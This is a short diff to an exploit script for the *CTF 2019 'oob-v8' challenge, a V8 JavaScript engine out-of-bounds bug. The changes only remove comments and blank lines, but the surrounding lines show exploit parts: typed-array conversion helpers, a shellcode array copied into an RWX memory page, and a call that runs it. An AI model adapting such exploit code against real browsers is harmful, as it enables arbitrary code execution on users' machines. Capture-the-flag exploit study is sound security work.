@@ -1,9 +1,7 @@
 /**
  * Exp for *CTF 2019: oob-v8
  */
-
-/// Helper functions to convert between float and integer primitives
-var buf = new ArrayBuffer(8); // 8 byte array buffer
+var buf = new ArrayBuffer(8);
 var f64_buf = new Float64Array(buf);
 var u64_buf = new Uint32Array(buf);
 
@@ -228,5 +226,4 @@ var shellcode = [
 copy_shellcode(rwx_page_addr, shellcode);
 
 // %SystemBreak();
-
 f();
